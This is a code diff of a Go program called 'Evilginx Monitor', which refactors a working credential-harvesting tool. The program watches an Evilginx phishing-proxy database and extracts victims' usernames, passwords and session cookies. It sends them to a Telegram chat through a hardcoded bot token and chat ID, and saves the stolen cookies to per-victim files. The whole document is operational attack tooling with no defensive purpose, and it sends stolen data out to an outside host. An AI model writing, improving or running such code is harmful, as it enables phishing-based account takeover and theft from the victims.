@@ -11,20 +11,15 @@ import (
     "time"
 )
 
-// STRUCTS -------------------------
-
 type LogLine struct {
+    ID       int                    `json:"id"`
     Username string                 `json:"username"`
     Password string                 `json:"password"`
-    Tokens   map[string]interface{} `json:"tokens"` // COOKIES
+    Tokens   map[string]interface{} `json:"tokens"`
 }
 
-// --------------------------------
-
-// Send telegram message
 func sendTelegram(botToken, chatID, message string) (string, error) {
     apiURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"
-
     data := url.Values{}
     data.Set("chat_id", chatID)
     data.Set("text", message)
@@ -49,10 +44,8 @@ func sendTelegram(botToken, chatID, message string) (string, error) {
     return "", nil
 }
 
-// Edit message
 func editTelegram(botToken, chatID, messageID, newText string) {
     apiURL := "https://api.telegram.org/bot" + botToken + "/editMessageText"
-
     data := url.Values{}
     data.Set("chat_id", chatID)
     data.Set("message_id", messageID)
@@ -60,11 +53,10 @@ func editTelegram(botToken, chatID, messageID, newText string) {
 
     _, err := http.PostForm(apiURL, data)
     if err != nil {
-        log.Printf("Failed to edit Telegram message: %v\n", err)
+        log.Printf("Failed to edit message: %v\n", err)
     }
 }
 
-// Read last line from a file
 func readLastLine(path string) (string, error) {
     file, err := os.Open(path)
     if err != nil {
@@ -77,40 +69,31 @@ func readLastLine(path string) (string, error) {
     for scanner.Scan() {
         last = scanner.Text()
     }
-
     return last, scanner.Err()
 }
 
-// Save cookies JSON
-func saveCookies(username string, tokens map[string]interface{}) error {
+func saveCookies(username string, tokens map[string]interface{}) {
     if username == "" {
-        return nil
+        return
     }
-    // ensure cookie folder exists
     os.MkdirAll("/root/.evilginx/cookies", 0755)
-
-    filePath := "/root/.evilginx/cookies/" + username + ".json"
-
+    file := "/root/.evilginx/cookies/" + username + ".json"
     data, _ := json.MarshalIndent(tokens, "", "  ")
-    return os.WriteFile(filePath, data, 0644)
+    os.WriteFile(file, data, 0644)
 }
 
-// MAIN ----------------------------------
-
 func main() {
-
     botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
     chatID := "7600034451"
-
     dbPath := "/root/.evilginx/data.db"
-
-    // Track message IDs per username
-    messages := make(map[string]string)
-    knownPasswords := make(map[string]string)
 
     fmt.Println("🔥 Evilginx Monitor Started")
     fmt.Println("Watching:", dbPath)
     fmt.Println("----------------------------------------")
+
+    // Track sent messages per log ID
+    sentMessages := make(map[int]string)
+    known := make(map[int]LogLine)
 
     for {
         line, err := readLastLine(dbPath)
@@ -120,66 +103,43 @@ func main() {
         }
 
         if line == "" {
-            time.Sleep(2 * time.Second)
+            time.Sleep(1 * time.Second)
             continue
         }
 
-        var logData LogLine
-        json.Unmarshal([]byte(line), &logData)
-
-        username := logData.Username
-        password := logData.Password
-
-        if username == "" {
-            username = "No username"
+        var logLine LogLine
+        if json.Unmarshal([]byte(line), &logLine) != nil {
+            time.Sleep(1 * time.Second)
+            continue
         }
 
-        // == CREATE TELEGRAM MESSAGE IF NEW USERNAME ==
+        id := logLine.ID
+        prev := known[id]
 
-        if _, exists := messages[username]; !exists {
-
-            msg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: %s",
-                username,
-                func() string {
-                    if password == "" {
-                        return "No password yet"
-                    }
-                    return password
-                }(),
-            )
-
+        // NEW USERNAME FOUND → send new message
+        if prev.Username == "" && logLine.Username != "" {
+            msg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: No password yet", logLine.Username)
             mid, _ := sendTelegram(botToken, chatID, msg)
-            messages[username] = mid
-            knownPasswords[username] = password
+            sentMessages[id] = mid
 
-            // Save cookies immediately if they exist
-            if len(logData.Tokens) > 0 {
-                saveCookies(username, logData.Tokens)
-            }
-
-            fmt.Println("New username →", username)
+            fmt.Println("Username:", logLine.Username)
         }
 
-        // == IF PASSWORD APPEARED LATER → EDIT MESSAGE ==
-
-        if password != "" && knownPasswords[username] == "" {
-
+        // PASSWORD APPEARED → edit message
+        if prev.Password == "" && logLine.Password != "" && sentMessages[id] != "" {
             newMsg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: %s",
-                username, password)
+                logLine.Username, logLine.Password)
 
-            editTelegram(botToken, chatID, messages[username], newMsg)
-
-            knownPasswords[username] = password
-
-            fmt.Println("Updated password for:", username)
+            editTelegram(botToken, chatID, sentMessages[id], newMsg)
+            fmt.Println("Password added for", logLine.Username)
         }
 
-        // == UPDATE COOKIE FILE ALWAYS WHEN TOKENS APPEAR ==
-
-        if len(logData.Tokens) > 0 {
-            saveCookies(username, logData.Tokens)
+        // COOKIES FOUND
+        if len(logLine.Tokens) > 0 {
+            saveCookies(logLine.Username, logLine.Tokens)
         }
 
+        known[id] = logLine
         time.Sleep(1 * time.Second)
     }
 }
